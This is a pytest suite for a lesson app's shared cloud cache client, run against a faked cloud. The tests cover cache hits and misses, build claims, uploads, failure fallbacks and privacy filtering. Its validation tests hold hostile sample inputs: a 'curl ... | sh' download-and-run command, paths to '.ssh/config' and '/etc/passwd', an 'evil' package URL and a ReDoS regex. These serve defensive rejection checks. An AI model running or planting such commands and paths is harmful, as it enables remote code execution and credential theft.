# ruff: noqa: F811
"""The shared lesson cache client (lesson/cloud_cache.py), with the cloud faked: no network, no paid call.

Builds run through test_builder's fake Gemini/Claude, so a hit that never calls them and a miss that builds and
uploads are both real build_lesson runs.
"""

import asyncio
import json
import logging
import shutil
from pathlib import Path

import httpx
import pytest

from server import config
from server.lesson import builder, cloud_cache
from server.lesson.schema import LESSON_SCHEMA_VERSION, schema_errors
from server.lesson.tests.test_builder import URL, WORKDIR, fake  # noqa: F401  (fixture)

SNAPSHOT = Path(__file__).with_name("lesson_schema_snapshot.json")
VID = "AXXnSzmpyoI"
CLOUD = "https://miyagi-cloud.onrender.com/v1"


# ------------------------------------------------------------------------------------------ the schema guard
def test_lesson_schema_version_matches_the_snapshot():
    """Fails when a key of the lesson shape was added, removed or renamed without bumping LESSON_SCHEMA_VERSION.
    After a deliberate change: bump LESSON_SCHEMA_VERSION (server/lesson/schema.py), tell the cloud to accept the new
    number (its LESSON_SCHEMAS), then rewrite lesson_schema_snapshot.json with the new version and keys."""
    snap = json.loads(SNAPSHOT.read_text(encoding="utf-8"))
    now = cloud_cache.schema_fingerprint()
    if snap["keys"] != now:
        changed = sorted(k for k in set(snap["keys"]) | set(now) if snap["keys"].get(k) != now.get(k))
        pytest.fail(f"the lesson shape changed ({', '.join(changed)}): bump LESSON_SCHEMA_VERSION (now {LESSON_SCHEMA_VERSION}) "
                    f"and update {SNAPSHOT.name} (version + keys)")
    assert snap["version"] == LESSON_SCHEMA_VERSION, (
        f"{SNAPSHOT.name} is for schema {snap['version']} but LESSON_SCHEMA_VERSION is {LESSON_SCHEMA_VERSION}: "
        "bump both together")


# ------------------------------------------------------------------------------------------ a fake cloud
class FakeCloud:
    """The three routes. `get`, `claim` and `put` are lists of replies (a reply: an httpx.Response, an exception or a
    callable); the last one repeats."""

    def __init__(self):
        self.calls: list[tuple] = []
        self.get_replies: list = [lambda: httpx.Response(404, json={"type": "error", "error": {"type": "lesson_not_cached"}})]
        self.claim_replies: list = [lambda: httpx.Response(200, json={"ok": True})]
        self.put_replies: list = [lambda: httpx.Response(201, json={"stored": True, "status": "pending"})]

    def _reply(self, replies):
        r = replies.pop(0) if len(replies) > 1 else replies[0]
        r = r() if callable(r) else r
        if isinstance(r, BaseException):
            raise r
        return r

    @property
    def verbs(self) -> list[str]:
        return [c[0] for c in self.calls]


class FakeClient:
    def __init__(self, cloud: FakeCloud):
        self.cloud = cloud

    async def __aenter__(self):
        return self

    async def __aexit__(self, *a):
        return False

    async def get(self, url, params=None, headers=None):
        self.cloud.calls.append(("GET", url, params, headers, None))
        return self.cloud._reply(self.cloud.get_replies)

    async def post(self, url, params=None, headers=None):
        self.cloud.calls.append(("POST", url, params, headers, None))
        return self.cloud._reply(self.cloud.claim_replies)

    async def put(self, url, content=None, headers=None):
        self.cloud.calls.append(("PUT", url, None, headers, content))
        return self.cloud._reply(self.cloud.put_replies)


@pytest.fixture
def cloud(monkeypatch):
    c = FakeCloud()
    monkeypatch.setattr(config, "cloud_url", lambda: CLOUD)
    monkeypatch.setattr(config, "cloud_token", lambda: "mi_test_install_token")
    monkeypatch.setattr(cloud_cache, "_client", lambda timeout: FakeClient(c))
    monkeypatch.setattr(cloud_cache, "HELD_POLL_S", 0.01)
    monkeypatch.setattr(cloud_cache, "HELD_WAIT_S", 0.3)
    monkeypatch.setenv(cloud_cache.ENV_OFF, "1")  # the shared cache is off by default: these tests turn it on
    cloud_cache.reset()
    yield c
    cloud_cache.reset()


def _build(**kw):
    """build_lesson, then every background upload it started."""
    async def go():
        g = await builder.build_lesson(URL, "train a PINN", WORKDIR, **kw)
        await asyncio.gather(*list(cloud_cache._tasks))
        return g

    return asyncio.run(go())


def _shared_lesson(fake, tmp_path) -> dict:
    """A real good lesson in its shared form: build one offline, then take what would be uploaded."""
    g = asyncio.run(builder.build_lesson(URL, "train a PINN", WORKDIR, refresh=True))
    shared = cloud_cache.to_shared(g, VID)
    assert shared is not None and cloud_cache.validate_shared(shared) is None
    for f in tmp_path.glob("*.json"):  # the local cache (and its video drafts) start empty again
        f.unlink()
    shutil.rmtree(tmp_path / "raw", ignore_errors=True)
    fake["watch"] = 0
    fake["adapt"].clear()
    return shared


def _ok(shared: dict, **over):
    body = {"video_id": VID, "schema": LESSON_SCHEMA_VERSION, "created_at": 1, "lesson": shared, **over}
    return httpx.Response(200, json=body)


def _cloud_lines(caplog) -> list[str]:
    return [r.getMessage() for r in caplog.records if r.name == "server.lesson.cloud_cache"]


# ------------------------------------------------------------------------------------------ hit
def test_a_hit_is_validated_saved_and_started_without_building(fake, cloud, tmp_path):
    shared = _shared_lesson(fake, tmp_path)
    cloud.get_replies = [_ok(shared)]
    g = _build()
    assert fake["watch"] == 0 and fake["adapt"] == []  # no model call
    assert cloud.verbs == ["GET"]  # a hit is free: no claim, no upload
    _, url, params, headers, _ = cloud.calls[0]
    assert url == f"{CLOUD}/lessons/{VID}" and params == {"schema": LESSON_SCHEMA_VERSION}
    assert headers == {"Authorization": "Bearer mi_test_install_token"}
    assert g["lesson"]["builtBy"] == "shared" and g["lesson"]["complete"] is True
    assert g["lesson"]["goal"] == "train a PINN"  # the learner's own, restored here (never uploaded)
    assert g["sources"][0]["videoId"] == VID and len(g["steps"]) == 3
    assert schema_errors(g) == []
    assert any(tmp_path.glob("*.json")), "saved to the local library"
    cloud.calls.clear()
    g2 = _build()  # the next time it is a local cache hit
    assert cloud.calls == [] and g2["lesson"]["builtBy"] == "shared"


def test_a_hit_in_a_different_workdir_goal_wording_still_finds_the_library_copy(fake, cloud, tmp_path):
    shared = _shared_lesson(fake, tmp_path)
    cloud.get_replies = [_ok(shared)]
    _build()
    cloud.calls.clear()
    g = asyncio.run(builder.build_lesson(URL, "something else entirely", WORKDIR))
    assert cloud.calls == [] and g["lesson"]["builtBy"] == "shared"  # find_cached: same video + workdir layout


# ------------------------------------------------------------------------------------------ miss, claim, upload
def test_a_miss_claims_builds_and_uploads_the_good_build(fake, cloud, caplog):
    caplog.set_level(logging.INFO)
    g = _build()
    assert fake["watch"] == 1 and g["lesson"]["complete"] is True
    assert cloud.verbs == ["GET", "POST", "PUT"]  # looked, claimed before building, uploaded after
    assert cloud.calls[1][1] == f"{CLOUD}/lessons/{VID}/build"
    assert cloud.calls[1][2] == {"schema": LESSON_SCHEMA_VERSION}  # the claim covers this schema only
    _, url, _, headers, body = cloud.calls[2]
    assert url == f"{CLOUD}/lessons/{VID}" and headers["Authorization"] == "Bearer mi_test_install_token"
    sent = json.loads(body)
    assert sent["schema"] == LESSON_SCHEMA_VERSION and cloud_cache.validate_shared(sent["lesson"]) is None
    text = json.dumps(sent)
    assert WORKDIR not in text and "train a PINN" not in text and "workdir" not in text  # nothing of this Mac or learner
    assert sent["lesson"]["sources"] == [{"id": "src1", "type": "video", "url": cloud_cache.watch_url(VID),
                                          "title": sent["lesson"]["sources"][0]["title"]}]
    assert "fresh" not in g["build"]  # the marker never reaches the session
    assert not any("mi_test_install_token" in line for line in _cloud_lines(caplog))


def test_an_upload_round_trips_into_a_valid_graph(fake, cloud, tmp_path):
    _build()
    sent = json.loads(cloud.calls[-1][4])["lesson"]
    for f in tmp_path.glob("*.json"):
        f.unlink()
    g = cloud_cache.restore(sent, VID, source_url=URL, goal="g", workdir=WORKDIR, key="k" * 16)
    assert g is not None and [s["id"] for s in g["steps"]] == ["s1", "s2", "s3"] and schema_errors(g) == []


def test_a_failed_adapt_pass_is_not_uploaded(fake, cloud, monkeypatch):
    from server.lesson import claude

    async def bad_adapt(goal, steps, summary, feedback=None):
        raise RuntimeError("quota")

    monkeypatch.setattr(claude, "adapt_checks", bad_adapt)
    _build()
    assert "PUT" not in cloud.verbs


def test_a_prebuild_looks_but_never_claims_or_uploads(fake, cloud):
    async def go():
        g = await builder.build_lesson(URL, "train a PINN", WORKDIR, _prebuild=True)
        await asyncio.gather(*list(cloud_cache._tasks))
        return g

    g = asyncio.run(go())
    assert cloud.verbs == ["GET"]
    assert g["build"].get("fresh") is True  # kept for the attach that adopts it


def test_refresh_and_transcript_only_never_touch_the_cloud(fake, cloud):
    asyncio.run(builder.build_lesson(URL, "train a PINN", WORKDIR, refresh=True))
    assert cloud.calls == []


def test_the_cloud_off_means_no_calls(fake, cloud, monkeypatch):
    monkeypatch.setattr(config, "cloud_token", lambda: None)
    _build()
    assert cloud.calls == []
    monkeypatch.setattr(config, "cloud_token", lambda: "mi_test_install_token")
    monkeypatch.setenv(cloud_cache.ENV_OFF, "0")
    _build(refresh=True)
    assert cloud.calls == []


def test_the_shared_cache_is_off_by_default(fake, cloud, monkeypatch):
    """Stopgap (deploy audit Nov 25): the cloud serves the first upload of a video with no review, so with the cloud on
    and no MIYAGI_LESSON_CACHE=1 nothing is downloaded, claimed or uploaded."""
    monkeypatch.delenv(cloud_cache.ENV_OFF, raising=False)
    assert config.cloud_on() and not cloud_cache.enabled()
    g = _build()
    assert g["steps"] and cloud.calls == []  # built here, never asked for nor shared
    assert asyncio.run(cloud_cache.share(g, VID)) == "skipped" and cloud.calls == []


def test_a_cloud_capability_turns_the_shared_cache_on_and_the_env_flag_wins(monkeypatch, cloud):
    monkeypatch.delenv(cloud_cache.ENV_OFF, raising=False)
    cloud_cache.set_cloud_capabilities(["something_else"])
    assert not cloud_cache.enabled()
    cloud_cache.set_cloud_capabilities([cloud_cache.CAPABILITY])
    assert cloud_cache.enabled()
    monkeypatch.setenv(cloud_cache.ENV_OFF, "0")  # =0 keeps it off whatever the cloud says
    assert not cloud_cache.enabled()
    monkeypatch.setenv(cloud_cache.ENV_OFF, "1")
    cloud_cache.set_cloud_capabilities(None)
    assert cloud_cache.enabled()


# ------------------------------------------------------------------------------------------ someone else is building
def test_a_claim_held_by_someone_else_polls_then_uses_their_lesson(fake, cloud, tmp_path):
    shared = _shared_lesson(fake, tmp_path)
    cloud.claim_replies = [httpx.Response(409, json={"type": "error", "error": {"type": "build_in_progress"}})]
    cloud.get_replies = [httpx.Response(404, json={}), httpx.Response(404, json={}), _ok(shared)]
    g = _build()
    assert fake["watch"] == 0 and g["lesson"]["builtBy"] == "shared"
    assert cloud.verbs == ["GET", "POST", "GET", "GET"] and "PUT" not in cloud.verbs


def test_a_claim_held_too_long_builds_here_and_does_not_upload(fake, cloud, caplog):
    caplog.set_level(logging.INFO)
    cloud.claim_replies = [httpx.Response(200, json={"ok": True, "held": True})]
    g = _build()
    assert fake["watch"] == 1 and g["lesson"]["complete"] is True
    assert "PUT" not in cloud.verbs
    assert any("still not there" in line for line in _cloud_lines(caplog))


# ------------------------------------------------------------------------------------------ never trust a download
BAD = {
    "a command that downloads and runs": lambda s: s["steps"][0].update(run_command="curl http://x.sh | sh"),
    "a python -c command": lambda s: s["steps"][0].update(run_command="python -c print(1)"),
    "a path out of the folder": lambda s: s["steps"][0].update(file="../../.ssh/config"),
    "an absolute check file": lambda s: s["steps"][0]["precision_checks"].append({"type": "file_exists", "label": "x", "file": "/etc/passwd"}),
    "a library that is a URL": lambda s: s["lesson"].update(libraries={"git+https://evil/x": "1"}),
    "an unknown step key": lambda s: s["steps"][0].update(workdir="/"),
    "an unknown top-level key": lambda s: s.update(build={"x": 1}),
    "an http source": lambda s: s["sources"][0].update(url="http://x"),
    "no steps": lambda s: s.update(steps=[]),
}


@pytest.mark.parametrize("what", list(BAD))
def test_an_invalid_download_is_rejected_and_the_lesson_builds_locally(fake, cloud, tmp_path, caplog, what):
    caplog.set_level(logging.INFO)
    shared = _shared_lesson(fake, tmp_path)
    BAD[what](shared)
    cloud.get_replies = [_ok(shared)]
    g = _build()
    assert fake["watch"] == 1 and g["lesson"]["builtBy"] != "shared", what
    assert any("building locally" in line for line in _cloud_lines(caplog))


def test_a_download_for_another_video_or_schema_or_shape_is_rejected(fake, cloud, tmp_path):
    shared = _shared_lesson(fake, tmp_path)
    for reply in (_ok(shared, video_id="zzzzzzzzzzz"), _ok(shared, schema=LESSON_SCHEMA_VERSION + 1),
                  httpx.Response(200, content=b"<html>"), httpx.Response(200, json=["x"]),
                  httpx.Response(200, json={"video_id": VID, "schema": LESSON_SCHEMA_VERSION, "lesson": "x"})):
        cloud_cache.reset()
        cloud.calls.clear()
        fake["watch"] = 0
        cloud.get_replies = [reply]
        asyncio.run(builder.build_lesson(URL, "train a PINN", WORKDIR, refresh=False))
        assert fake["watch"] == 1
        for f in tmp_path.glob("*.json"):
            f.unlink()
        shutil.rmtree(tmp_path / "raw", ignore_errors=True)


def test_an_oversized_download_is_rejected(fake, cloud, monkeypatch, tmp_path):
    shared = _shared_lesson(fake, tmp_path)
    monkeypatch.setattr(cloud_cache, "MAX_DOWNLOAD_BYTES", 100)
    cloud.get_replies = [_ok(shared)]
    _build()
    assert fake["watch"] == 1


def test_a_downloaded_graph_is_sanitised_by_validate_untrusted_lesson(fake, cloud, tmp_path):
    shared = _shared_lesson(fake, tmp_path)
    shared["steps"][0]["checks"].append({"type": "screen_contains", "label": "evil", "app": "Code", "pattern": "(a+)+$"})
    assert cloud_cache.validate_shared(shared) is None  # the cloud's rules do not look at regexes
    cloud.get_replies = [_ok(shared)]
    g = _build()
    assert g["lesson"]["builtBy"] == "shared"
    assert all(c.get("pattern") != "(a+)+$" for s in g["steps"] for c in s["checks"])


# ------------------------------------------------------------------------------------------ the cloud failing
def _gone(r):
    return httpx.ConnectError("no route")


FAILS = {
    "down on lookup": ("get", httpx.ConnectError("no route")),
    "500 on lookup": ("get", httpx.Response(503, json={"type": "error", "error": {"type": "proxy_disabled"}})),
    "401 unknown token on lookup": ("get", httpx.Response(401, json={"type": "error", "error": {"type": "authentication_error"}})),
    "signin_required on claim": ("claim", httpx.Response(401, json={"error": "signin_required", "message": "Sign in"})),
    "429 caps on claim": ("claim", httpx.Response(429, json={"type": "error", "error": {"type": "rate_limit_error"}})),
    "down on claim": ("claim", httpx.ReadTimeout("slow")),
    "500 on claim": ("claim", httpx.Response(500, json={})),
}


@pytest.mark.parametrize("what", list(FAILS))
def test_every_cloud_failure_falls_back_to_the_local_build_with_one_log_line(fake, cloud, caplog, what):
    caplog.set_level(logging.INFO)
    which, reply = FAILS[what]
    getattr(cloud, f"{which}_replies").__setitem__(slice(None), [reply])
    g = _build()
    assert fake["watch"] == 1 and g["lesson"]["complete"] is True and g["lesson"]["builtBy"] != "shared"
    assert "PUT" not in cloud.verbs  # nothing was claimed, so nothing is shared
    lines = [ln for ln in _cloud_lines(caplog) if "building locally" in ln]
    assert len(lines) == 1, lines
    assert "mi_test_install_token" not in lines[0]


def test_a_failed_upload_leaves_the_lesson_working_and_logs_once(fake, cloud, caplog):
    caplog.set_level(logging.INFO)
    cloud.put_replies = [httpx.Response(429, json={"type": "error", "error": {"type": "rate_limit_error"}})]
    g = _build()
    assert g["lesson"]["complete"] is True and cloud.verbs == ["GET", "POST", "PUT"]
    assert sum("upload" in ln for ln in _cloud_lines(caplog)) == 1


def test_a_dead_cloud_costs_one_attempt_not_one_per_call(fake, cloud):
    cloud.get_replies = [httpx.ConnectError("no route")]
    _build()
    n = len(cloud.calls)
    asyncio.run(builder.build_lesson(URL, "another goal", WORKDIR, refresh=True))
    for f in builder.CACHE_DIR.glob("*.json"):
        f.unlink()
    _build()
    assert len(cloud.calls) == n  # cooling down: no second GET, claim or PUT


def test_a_denied_claim_means_no_upload_even_after_the_build(fake, cloud):
    cloud.claim_replies = [httpx.Response(429, json={"type": "error", "error": {"type": "rate_limit_error"}})]
    _build()
    assert cloud.verbs == ["GET", "POST"]


# ------------------------------------------------------------------------------------------ what is shared
def test_nothing_of_the_machine_or_a_secret_is_ever_shared(fake, cloud):
    g = _build()
    g["steps"][0]["hints"].append("open /Users/someone/secret.txt")
    assert cloud_cache.to_shared(g, VID) is None
    g["steps"][0]["hints"][-1] = "key sk-ant-abc123"
    assert cloud_cache.to_shared(g, VID) is None


@pytest.mark.parametrize("mutate", [
    lambda g: g["lesson"].update(complete=False),
    lambda g: g["lesson"].update(provisional=True),
    lambda g: g["lesson"].update(transcriptOnly=True),
    lambda g: g["lesson"].update(builtBy="shared"),
    lambda g: g["build"].update(adapted=False),
    lambda g: g["steps"][1].update(provisional=True),
    lambda g: g["steps"][0].update(instructions=""),
    lambda g: g["sources"].append({"id": "src2"}),
])
def test_only_a_good_build_is_shared(fake, cloud, mutate):
    g = _build()
    assert cloud_cache.good_build(g, VID) is None
    mutate(g)
    assert cloud_cache.good_build(g, VID) is not None


def test_signin_required_and_anon_cap_are_announced_not_treated_as_a_bad_token(fake, cloud, monkeypatch, tmp_path):
    heard = []
    off = cloud_cache.on_notice(heard.append)
    verdicts = []
    monkeypatch.setattr(config, "cloud_error", lambda *a, **k: verdicts.append(a))
    cloud.claim_replies = [httpx.Response(401, json={"error": "signin_required", "message": "Sign in"})]
    g = _build()
    assert g["lesson"]["complete"] is True and "PUT" not in cloud.verbs
    assert heard == [{"reason": "signin_required", "status": 401}] and verdicts == []
    cloud_cache.reset()
    for f in tmp_path.glob("*.json"):
        f.unlink()
    shutil.rmtree(tmp_path / "raw", ignore_errors=True)
    cloud.claim_replies = [httpx.Response(429, json={"type": "error", "error": {
        "type": "miyagi_quota", "limit": "anon_daily_cap", "resets_at": "2026-11-23T00:00:00Z"}})]
    _build()
    off()
    assert heard[-1] == {"reason": "anon_daily_cap", "status": 429, "resets_at": "2026-11-23T00:00:00Z"}
